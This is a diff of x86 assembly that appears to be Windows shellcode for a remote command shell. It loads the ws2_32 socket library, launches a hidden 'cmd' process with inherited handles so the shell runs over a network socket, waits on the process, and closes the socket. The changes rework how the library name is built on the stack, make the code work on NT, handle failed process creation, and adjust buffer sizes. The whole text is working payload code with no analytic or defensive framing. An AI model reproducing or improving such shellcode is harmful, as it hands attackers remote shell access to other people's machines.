@@ -285,15 +285,20 @@ gapi_l6x:
     bits   32    
 
 rc_l2:    
-    add    esp, -256   ; edi = alloc(256)
+    add    esp, -384   ; edi = alloc(384)
     mov    edi, esp
     
     ; LoadLibraryA ("ws2_32");
+    xor    eax, eax
+    cdq
+    push   eax
+    push   eax
+    mov    edx, esp
     mov    eax, ~'32'
     not    eax
-    push   eax
-    push   'ws2_'
-    push   esp
+    mov    dword[edx+4], eax
+    mov    dword[edx], 'ws2_'
+    push   edx    
     call   ebp
     pop    eax
     pop    eax
@@ -388,22 +393,24 @@ rc_l10x:
     push   ecx         ; NULL
     push   ecx         ; NULL
     push   edx         ; CREATE_NO_WINDOW
-    push   edx         ; TRUE
+    push   1           ; TRUE, must be 1 for NT
     push   ecx         ; NULL
     push   ecx         ; NULL    
     push   eax         ; "cmd", 0
     push   ecx         ; NULL
     call   ebp
+    neg    eax
+    jns    bd_cls
     
     ; WaitForSingleObject (pi.hProcess, INFINITE);
-    push   -1          ; INFINITE
+    push   eax         ; INFINITE
     mov    eax, [edi]
     push   eax         ; pi.hProcess
     call   ebp
-    
+bd_cls:    
     ; closesocket (s);
     push   ebx         ; s
     call   ebp
     
-    sub    esp, -256
+    sub    esp, -512
     ret    
